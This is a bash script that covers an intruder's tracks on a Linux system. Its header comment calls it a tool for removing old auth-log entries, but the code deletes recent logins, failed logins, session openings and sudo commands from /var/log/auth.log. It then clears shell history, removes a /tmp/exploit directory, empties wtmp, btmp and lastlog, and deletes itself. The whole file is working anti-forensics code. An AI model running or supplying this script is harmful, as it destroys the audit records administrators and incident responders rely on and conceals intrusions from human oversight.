#!/bin/bash
###############################################
# This script deletes auth logs from the system
# based on a specified time window.
# It uses the system's auth.log file and removes
# entries older than the specified time.
###############################################

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    echo "ERROR: You must source this script instead of executing it."
    echo "Use: source $0 <time-window> or . $0 <time-window>"
    exit 1
fi

if [ -z "$1" ]; then
    echo "Usage: source $0 <time-window>"
    echo "Example: source $0 10m  # for last 10 minutes"
    echo "         source $0 1h   # for last 1 hour"
    echo "         source $0 2d   # for last 2 days"
    return 1 2>/dev/null || exit 1
fi

LOGFILE="/var/log/auth.log"
TIME_WINDOW="$1"
CURRENT_EPOCH=$(date +%s)

case "$TIME_WINDOW" in
    *m) OFFSET=$(( ${TIME_WINDOW%m} * 60 )) ;;
    *h) OFFSET=$(( ${TIME_WINDOW%h} * 3600 )) ;;
    *d) OFFSET=$(( ${TIME_WINDOW%d} * 86400 )) ;;
    *)
        echo "Invalid time window format. Use m (minutes), h (hours), or d (days)."
        return 1 2>/dev/null || exit 1
        ;;
esac

START_EPOCH=$(( CURRENT_EPOCH - OFFSET ))
TMP_FILE=$(mktemp)

echo "Cleaning logs in $LOGFILE from last $TIME_WINDOW"
echo "System time: $(date -d "@$CURRENT_EPOCH")"
echo "Start time:  $(date -d "@$START_EPOCH")"

SEARCH_TERMS=(
    "Accepted password"
    "Failed password"
    "session opened for user"
    "New session"
    "COMMAND=/bin/bash"
    "authentication failure"
    "COMMAND"
)

while IFS= read -r line; do
    TIMESTAMP=$(echo "$line" | grep -oE '^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9:.]+')
    if [[ -z "$TIMESTAMP" ]]; then
        echo "$line" >> "$TMP_FILE"
        continue
    fi

    TIMESTAMP_CLEAN=$(echo "$TIMESTAMP" | sed -E 's/\.[0-9]+//; s/\+.*//')
    LINE_EPOCH=$(date -d "$TIMESTAMP_CLEAN" +%s 2>/dev/null)
    if [[ $? -ne 0 ]]; then
        echo "$line" >> "$TMP_FILE"
        continue
    fi

    SHOULD_DELETE=false
    for term in "${SEARCH_TERMS[@]}"; do
        if [[ "$line" == *"$term"* ]]; then
            SHOULD_DELETE=true
            break
        fi
    done

    if [[ $LINE_EPOCH -ge $START_EPOCH && "$SHOULD_DELETE" == true ]]; then
        continue
    fi

    echo "$line" >> "$TMP_FILE"
done < "$LOGFILE"

cat "$TMP_FILE" > "$LOGFILE"
rm -f "$TMP_FILE"

chown syslog:adm "$LOGFILE"
chmod 640 "$LOGFILE"

# -----------------------------------------------
# Clear memory history only
echo "Wiping only in-memory shell history for current session."
history -c
unset HISTFILE

rm -rf /tmp/exploit

echo "Truncating system login logs."
truncate -s 0 /var/log/wtmp
truncate -s 0 /var/log/btmp
truncate -s 0 /var/log/lastlog

# -----------------------------------------------
# Self-delete script
echo "Deleting this script."
rm -f "${BASH_SOURCE[0]}" || echo "Failed to delete script file."
